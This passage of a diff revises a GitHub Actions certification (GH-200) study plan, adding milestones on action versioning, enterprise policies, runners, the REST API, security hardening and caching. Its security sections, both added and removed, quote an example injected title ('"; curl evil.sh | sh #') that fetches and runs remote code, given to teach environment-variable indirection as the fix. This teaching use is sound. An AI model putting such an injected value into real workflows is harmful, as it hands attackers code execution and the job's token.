+  caller); inputs come through as `${{ inputs.x }}`.
+- *Docker action*: Linux-only, slower to start (image build/pull on every cold run), but gives
+  full control of the execution environment.
+
+## Milestone 6 — Custom actions II: versioning, distribution, debugging (1-2 sessions)
+- **Theory (30min):** Versioning actions docs (semver + the moving major tag convention).
+  Immutable actions docs. Publishing to the GitHub Marketplace docs. Debug logging docs.
+- **Hands-on (30-60min):** Publish `v1.0.0`, then move a `v1` tag onto it; build the small
+  release workflow that does the retag automatically. Pin a reference to the full 40-character
+  commit SHA instead and compare. Walk the Marketplace publish flow without finishing it
+  (public repo, `action.yml` at root, unique name, a tagged release). Set
+  `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG` as secrets and re-run a failed job with debug
+  logging on.
+- **Recall check:** explain the tension between the moving-tag convenience and the SHA-pin
+  security answer — and what immutable actions do to close that gap.
+
+**Exam summary:**
+- *The moving tag*: publish `v1.2.3`, then move `v1` to point at the same commit. Consumers on
+  `@v1` pick up non-breaking updates automatically; you only break them at `v2`.
+- *The tension*: a moving tag is mutable by definition — if the action is compromised, the
+  code under `@v1` changes beneath every consumer with no diff to review. So the
+  security-flavoured preferred answer is always **pin to the full commit SHA**, with Dependabot
+  raising PRs to bump the pins:
+  ```yaml
+  uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8  # v5.0.1
+  ```
+- *Immutable actions* close the gap from the other side: a released version is published as a
+  package whose contents can no longer change, so a version reference becomes as trustworthy as
+  a SHA. Know both answers — the exam tests whether you know *why* SHA-pinning exists, not just
+  that it does.
+- *Distribution models*: public repo, private repo inside the org, same-repo `./path`
+  reference, Marketplace — pick based on who needs to consume it and whether it should be
+  discoverable.
+
+## Milestone 7 — Midpoint self-test and repair (1 session)
+Half-time. No new theory — this is a checkpoint.
+- Build a full CI workflow from a blank file, no docs, no autocomplete: matrix across three
+  OS, a dependent job, cached dependencies, a value passed between jobs, a job summary. Time
+  yourself.
+- Build the reuse trio from memory: a reusable workflow with typed inputs and a secret, a
+  composite action wrapping three steps with an output, a starter workflow template with its
+  `.properties.json`.
+- Mark your own work against the docs — be harsh, a workflow that wouldn't run is a fail, not
+  a near miss.
+- Take the official practice assessment a second time; compare the per-domain split against
+  the Milestone 0 baseline.
+- Repair whichever milestone the last two exercises exposed as weakest, hands-on, before
+  moving on to Milestone 8.
+
+## Milestone 8 — Enterprise I: policies & governance (2 sessions)
+- **Theory (30-45min):** Org-level Actions policies docs. Fork pull request approval docs.
+  Default `GITHUB_TOKEN` permissions docs. Secrets/variables scoping docs (org, repo,
+  environment). Managing secrets via the REST API docs.
+- **Hands-on (1-2 sessions):** Set the org's Actions policy to "Allow select actions," add a
+  verified-creator toggle and an explicit `owner/*` pattern. Open a PR from a fork against
+  `gha` (a second account or a throwaway fork) and observe the approval requirement. Set the
+  default `GITHUB_TOKEN` permission to read-only at repo level, watch which existing workflow
+  breaks, and fix it with an explicit `permissions:` block. Create a secret with the same name
+  at org, repo, and environment level in `gha` and prove the precedence you already know.
+  Create and list a secret via the REST API, including the libsodium public-key encryption
+  step.
+- **Recall check:** name the four Actions policy settings, from most to least permissive.
+
+**Exam summary:**
+- *Org Actions policy, escalating choices*: disable Actions entirely → allow all actions and
+  reusable workflows → allow only actions/workflows from within the enterprise or organization
+  → **allow select actions**, which exposes three independent toggles: actions created by
+  GitHub, Marketplace verified-creator actions, and a free-text allow-list of patterns
+  (`owner/*`, `owner/repo@ref`).
+- *Fork PRs*: anyone can fork a public repo and open a PR proposing workflow changes, so
+  workflows triggered by fork PRs don't get secrets and may require approval depending on the
+  contributor-approval policy. `pull_request_target` combined with checking out the PR head is
+  the dangerous pattern — it runs with the base repo's full permissions and secrets against
+  attacker-controlled code.
+- *`GITHUB_TOKEN`*: default permission scope is configurable at org and repo level
+  (read-only vs read/write); a workflow can further narrow with its own `permissions:` block,
+  never widen past the default.
+- *Secret precedence, confirmed hands-on*: `environment > repository > organization` — most
+  specific wins, others simply aren't visible to that job.
+
+## Milestone 9 — Enterprise II: runners at scale (2 sessions)
+- **Theory (30-45min):** GitHub-hosted runner images and the toolcache docs (runner-images
+  repo). Runner image migration notes — Ubuntu 20.04 removal, `windows-latest` moving to
+  Windows Server 2025. Self-hosted runner install/label/group docs. Self-hosted runner
+  security docs. `setup-*` actions docs.
+- **Hands-on (1-2 sessions):** Find the preinstalled tool list and toolcache contents for
+  `ubuntu-latest` in the runner-images repo. Add a label to the runner from Milestone 0, set
+  its group's access policy to scope it to `gha` only, and try `--ephemeral`. Install an extra
+  tool at runtime with a `setup-*` action and compare against relying on the toolcache.
+- **Recall check:** say out loud why this exact lab setup — self-hosted runner on a public
+  repo — is the configuration the exam's own security guidance warns against, and what you did
+  about it (labelled, scoped to one repo via its group, stopped when not in active use).
+
+**Exam summary:**
+- *Runner groups* collect runners and control which organizations, repositories, and workflows
+  may use them — the access boundary for runner fleets. Free, Team, and enterprise-owned orgs
+  can all create additional groups for self-hosted runners.
+- *The public-repo caveat, for real this time*: never leave a self-hosted runner attached to a
+  public repository unattended. A fork PR can execute arbitrary code on it, and self-hosted
+  runners persist state between jobs by default, so a compromise isn't confined to one run.
+  Ephemeral runners in disposable environments are the safer pattern if you need this for real.
+- *Toolcache*: GitHub-hosted runner images ship a large preinstalled set (languages, SDKs,
+  package managers), documented per-image in the runner-images repo's release notes — faster
+  than installing at runtime, but versions lag; `setup-*` actions (`setup-node`, `setup-python`,
+  …) pin exact versions when the toolcache's default isn't precise enough.
+- *Image migrations* are a real exam topic because they break pinned workflows: Ubuntu 20.04
+  was removed from hosted runners, and `windows-latest` has moved generations (most recently to
+  Windows Server 2025) — pin an exact image label (`ubuntu-22.04` rather than `ubuntu-latest`)
+  when you need stability across a migration window.
+
+## Milestone 10 — Enterprise III: the REST API and diagnosing failures (1-2 sessions)
+- **Theory (30min):** Workflow runs REST API docs (list, re-run, re-run-failed-jobs, cancel,
+  download logs/artifacts). Artifact and log retention docs, both UI and API. Artifacts v4
+  behaviour notes.
+- **Hands-on (1 session):** Set artifact/log retention in repo settings, then set it again via
+  the REST API and confirm they agree. Do each of list/re-run/re-run-failed/cancel/download
+  with `gh api` or `curl` against `gha`. Write three workflows that each fail for a different
+  reason, leave them a day, then debug each from the run log alone — no looking at the YAML
+  first. Correlate a matrix job's name back to its axis values from the run list, and re-run
+  only one failed variant without re-running the rest.
+- **Recall check:** from memory, what's the API call (or `gh` equivalent) to re-run only the
+  failed jobs in a run?
+
+**Exam summary:**
+- *Retention* can be set at org or repo level in the UI, and the same setting is reachable
+  through the REST API — the study guide calls the API path out explicitly, so expect a
+  question phrased around automating it rather than clicking it.
+- *Re-running failed jobs only* re-executes just the jobs that didn't succeed, keeping
+  successful jobs' results — distinct from re-running the whole workflow, which repeats
+  everything including jobs that already passed.
+- *Matrix troubleshooting*: each matrix job's display name embeds its axis values
+  (`build (ubuntu-latest, 18)`), which is how you correlate a failure back to a specific
+  combination without reading the matrix definition again; re-running one variant targets that
+  specific job, not the whole matrix.
+- *Artifacts v4* changed some prior behaviour (artifacts from different jobs no longer merge
+  into one by default, and immutability means an artifact can't be appended to after upload) —
+  know this is a *version* fact, not a universal one, if a question's wording suggests an older
+  behaviour.
+
+## Milestone 11 — Security: the new fifth domain (2-3 sessions)
+- **Theory (45min-1hr):** `GITHUB_TOKEN` lifecycle docs. Security hardening for GitHub Actions
+  guide (script injection section specifically). OIDC / cloud provider federation docs.
+  Artifact attestations / build provenance docs.
+- **Hands-on (1-2 sessions):** Put
+  `run: echo "${{ github.event.issue.title }}"` into a workflow in `gha` and break it with a
+  crafted issue title; fix it three ways (environment-variable indirection being the primary
+  one). Set `permissions: id-token: write` and walk through what the `sub` claim would look
+  like for this repo on a push to `main` vs. inside an `environment:`. Run
+  `actions/attest-build-provenance` on a build artifact and verify it with
+  `gh attestation verify`.
+- **Recall check:** why is interpolating untrusted input directly into `run:` dangerous, and
+  what's the fix? What permission does OIDC federation need, and what does it let you delete?
+
+**Exam summary:**
+- *`GITHUB_TOKEN`* is ephemeral and job-scoped — minted fresh per job, expires when the job
+  ends. `permissions:` at workflow or job level narrows its scope; contrast with classic PATs,
+  fine-grained PATs, and GitHub App tokens, which are the right answer when a workflow needs
+  access *outside* the triggering repo.
+- *Script injection*: `${{ }}` is interpolated into the script **as text, before the shell ever
+  runs**. A crafted title like `"; curl evil.sh | sh #` executes on the runner with the job's
+  token and whatever else is in scope. The fix is indirection through the environment, which
+  the shell receives as data, never as code:
+  ```yaml
+  - env:
+      TITLE: ${{ github.event.issue.title }}
+    run: echo "$TITLE"
+  ```
+  Supporting controls: least-privilege `permissions:`, preferring vetted actions over inline
+  shell, never combining `pull_request_target` with a checkout of the PR head.
+- *OIDC federation*: the job requests `permissions: id-token: write` (plus `contents: read`);
+  the runner asks GitHub's OIDC provider for a short-lived JWT; the cloud side validates the
+  issuer and the `sub` claim (`repo:org/name:ref:refs/heads/main` or
+  `repo:org/name:environment:production`) against a trust policy and returns short-lived cloud
+  credentials. **What it deletes**: long-lived cloud secrets stored in GitHub entirely —
+  nothing to rotate, nothing to leak, and the trust policy scopes access to a specific repo,
+  branch, or environment in a way a static key never could.
+- *Attestations/provenance*: `actions/attest-build-provenance` records what built an artifact
+  and how (SLSA-style provenance); `gh attestation verify` checks it before deployment — the
+  mechanism a deployment gate uses to refuse an artifact that didn't come from the expected
+  build.
+
+## Milestone 12 — Optimization: caching, environments, cost (1-2 sessions)
+- **Theory (30min):** `actions/cache` docs (`key`, `restore-keys`, `path`, scoping/eviction).
+  Environments and deployment protection rules docs. Workflow triggers' path/branch filter
+  docs.
+- **Hands-on (1 session):** Build a cache with an exact `key` and a `restore-keys` prefix
+  fallback; trigger a partial-match restore and observe the `cache-hit` output in both cases.
+  Create an environment on `gha` with a required reviewer and a wait timer, add an
+  environment-scoped secret, and watch a job pause for approval. Add `paths`/`paths-ignore`
+  filters to a trigger and confirm a doc-only change no longer fires the workflow.
+- **Recall check:** when is `actions/cache` the right tool vs. an artifact, and what does
+  `restore-keys` actually do on a cache miss?
+
+**Exam summary:**
+- *Cache key matching*: an exact `key` match restores that cache precisely; on a miss,
+  `restore-keys` tries each prefix in order and restores the most recent partial match (e.g. a
+  lockfile-hash key falling back to a branch-name prefix) — useful for warm-but-not-identical
+  dependency caches. Caches are also branch-scoped for restore purposes and evicted on an
+  LRU-ish basis under the account's total size cap.
+- *Cache vs. artifact*: cache is for speeding up future runs with the same inputs (dependencies,
+  build outputs keyed by a hash); artifacts are for carrying a *specific run's* output to a
+  later job or for human download, with their own retention policy and v4 immutability.
+- *Environments*: required reviewers and wait timers gate a job at the point it requests that
+  `environment:`, and environment secrets are only readable by a job that declares it — the
+  standard answer whenever a question pairs "production credentials" with "needs approval."
+- *Cost levers*: path/branch filters and `concurrency` to kill redundant runs, trimming matrix
+  size, and runner size choice all trade off against each other — a bigger runner that finishes
+  faster isn't automatically cheaper once the per-minute multiplier is accounted for.
+
+## Milestone 13 — Final review (1 session)
+- Flashcard-style sweep: re-read every Exam summary block above, end to end, no new material.
+- Self-rate the full Skills Measured list green/amber/red; spend any remaining time only on
+  reds.
+- Take the official practice assessment a third time; compare the trend across Milestones 0, 7,
+  and 13 — the trend matters more than the final number.
+- Exam-day logistics: proctored online — confirm system requirements, photo ID, and a quiet
+  room in advance, not day-of. Re-open the exam sandbox once more so the interface is familiar.
+
+**Domain → where it's covered in this doc** (use for this final pass; exam is 60 scored
+questions, 100 minutes, 700/1000 to pass, 2-year validity):
+
+| # | Exam domain | Weight | Covered in |
 |---|---|---|---|
-| **Starter workflow** | Org's `.github` repo, under `workflow-templates/` with a `.properties.json` | Copied into a repo when someone creates a new workflow | **No** — independent the moment it is copied |
-| **Reusable workflow** | Any repo, a real workflow with `on: workflow_call` | `jobs.<id>.uses: owner/repo/.github/workflows/x.yml@ref` | **Yes** — centrally versioned by ref |
-| **Composite action** | An `action.yml` with `runs.using: composite` | `steps: - uses:` inside a job | **Yes** — versioned by ref |
+| 1 | Author and manage workflows | 20-25% | M1, M2, M3, M4 (anchors), M12 (environments/filters) |
+| 2 | Consume and troubleshoot workflows | 15-20% | M4 (reuse trio), M10 |
+| 3 | Author and maintain actions | 15-20% | M5, M6 |
+| 4 | Manage GitHub Actions for the enterprise | 20-25% | M8, M9, M10 (API) |
+| 5 | Secure and optimize automation | 10-15% | M11, M12 (caching/cost) |
 
-Shortest way to hold it: a starter workflow is a *scaffold*, a reusable workflow
-supplies whole *jobs*, a composite action supplies *steps*.
-
-### Q8. Secrets into a reusable workflow, and `secrets: inherit`
-
-The callee declares what it accepts; the caller maps them explicitly:
-
-```yaml
-# callee
-on:
-  workflow_call:
-    secrets:
-      TOKEN:
-        required: true
-
-# caller
-jobs:
-  call:
-    uses: org/repo/.github/workflows/x.yml@v1
-    secrets:
-      TOKEN: ${{ secrets.NPM_TOKEN }}
-```
-
-`secrets: inherit` replaces that whole block and passes *every* secret available
-to the caller — org, repo and environment — without naming any of them. It is
-convenient and deliberately broad, which is why the security domain prefers
-explicit mapping: inherit gives the called workflow access to secrets it never
-declared a need for.
-
-### Q9. The three action types and the metadata filename
-
-**JavaScript**, **Docker container**, and **composite**.
-
-The metadata file is `action.yml` (`action.yaml` is also accepted), at the *root
-of the action's directory* — which for a Marketplace-published action means the
-root of the repository.
-
-### Q10. `runs.using` for a JavaScript action, and why bundle
-
-```yaml
-runs:
-  using: node20
-  main: dist/index.js
-  post: dist/cleanup.js
-```
-
-`pre` and `post` are optional hooks that run before and after the job's other
-steps.
-
-**Why bundling matters:** the runner checks out your action and executes `main`
-directly. It never runs `npm install`. So every dependency must already be in
-the repository — either by committing `node_modules` (large, noisy, slow to
-clone) or, far better, by compiling everything into one file with
-`@vercel/ncc` and committing `dist/`. An unbundled action fails at runtime with
-a module-not-found error, the single most common custom-action bug.
-
-### Q11. The moving `v1` tag, and SHA pinning
-
-You publish `v1.2.3` and also *move* a `v1` tag to point at that commit.
-Consumers writing `uses: owner/action@v1` then pick up non-breaking updates
-automatically, and you only break them at `v2`.
-
-**The tension the exam wants you to name:** a moving tag is mutable by
-definition, so if the action is compromised the code under `@v1` changes beneath
-every consumer. Hence the preferred answer in any security-flavoured question is
-**pin to the full 40-character commit SHA**, with Dependabot raising PRs to bump
-the pins:
-
-```yaml
-uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8  # v5.0.1
-```
-
-**Immutable actions** close the gap from the other side: a released version is
-published as a package and its contents can no longer change, so a version
-reference becomes as trustworthy as a SHA.
-
-### Q12. Secret precedence — *you had this one*
-
-`environment > repository > organization` — the most specific scope wins, and
-the others are simply not visible to that job.
-
-Worth adding: environment secrets are only readable by a job that declares
-`environment:`, and they are gated behind that environment's protection rules.
-That makes them the correct answer whenever a question involves production
-credentials plus an approval step.
-
-### Q13. Runner groups, and the self-hosted public-repo caveat
-
-A **runner group** collects runners and controls *which organizations,
-repositories and workflows* may use them — the access boundary for runner
-fleets. Enterprise accounts, orgs owned by them, and orgs on Team or Free can
-all create additional groups for self-hosted runners.
-
-**The caveat:** never attach self-hosted runners to public repositories. Anyone
-can fork and open a pull request, and a workflow triggered by that PR executes
-arbitrary code on your machine. Worse, self-hosted runners persist state between
-jobs by default, so a compromise is not confined to one run — the attacker can
-leave things behind. If you must, use ephemeral runners in disposable, isolated
-environments.
-
-### Q14. Restricting which actions an organization may use
-
-Organization Settings → Actions → General → *Policies*. The choices escalate:
-
-- Disable Actions entirely
-- Allow all actions and reusable workflows
-- Allow only actions and reusable workflows from within the enterprise or organization
-- **Allow select actions** — which then exposes three independent toggles:
-  actions created by GitHub, actions by Marketplace *verified creators*, and a
-  free-text allow list of patterns such as `owner/*` or `owner/repo@ref`
-
-Enterprise-level policy sits above this and can constrain what individual
-organizations are permitted to choose.
-
-### Q15. Why `run: echo "${{ github.event.pull_request.title }}"` is dangerous
-
-Because `${{ }}` is interpolated into the script *as text, before the shell ever
-runs*. A pull request titled `"; curl evil.sh | sh #` is substituted verbatim and
-then executed on the runner, with the job's `GITHUB_TOKEN` and anything else in
-scope. The attacker supplies the title; you supply the shell.
-
-**The fix is indirection through the environment** — the value arrives as data,
-never as script:
-
-```yaml
-- env:
-    TITLE: ${{ github.event.pull_request.title }}
-  run: echo "$TITLE"
-```
-
-Supporting controls: least-privilege `permissions:` so a successful injection
-gains little, preferring vetted actions over inline shell, and never combining
-`pull_request_target` with a checkout of the PR head — that trigger runs with
-full write permissions and access to secrets.
-
-### Q16. OIDC — the permission, and what it deletes
-
-The job requests a token, so it needs:
-
-```yaml
-permissions:
-  id-token: write
-  contents: read
-```
-
-The runner then asks GitHub's OIDC provider for a short-lived JWT. Your cloud
-validates the issuer and the `sub` claim — formatted like
-`repo:org/name:ref:refs/heads/main` or `repo:org/name:environment:production` —
-against a trust policy (an AWS IAM role trust relationship, an Azure federated
-credential, a GCP workload identity pool) and returns short-lived cloud
-credentials.
-
-**What it deletes:** the long-lived cloud secrets themselves. No
-`AWS_SECRET_ACCESS_KEY` stored in GitHub, nothing to rotate, nothing to leak —
-and the trust policy scopes access down to a specific repo, branch or
-environment, which a static key never could.
+**New since you last used Actions — the likeliest surprises:** OIDC cloud federation (M11),
+immutable actions + SHA pinning (M6), artifact attestations (M11), YAML anchors/aliases (M4),
+service containers (M3), granular `GITHUB_TOKEN` permissions (M8, M11), runner image
+migrations (M9).
 
 ---
-
-*Exam facts verified against the [GH-200 study guide](https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)
-and [credential page](https://learn.microsoft.com/en-us/credentials/certifications/github-actions/);
-plan availability against [GitHub Docs](https://docs.github.com/en/actions).
-Skills measured as of January 2026.*
+**Exit criteria per milestone:** can explain the theory out loud without notes AND can perform
+the hands-on task from memory. If either fails, that milestone isn't done — loop back before
+moving on.
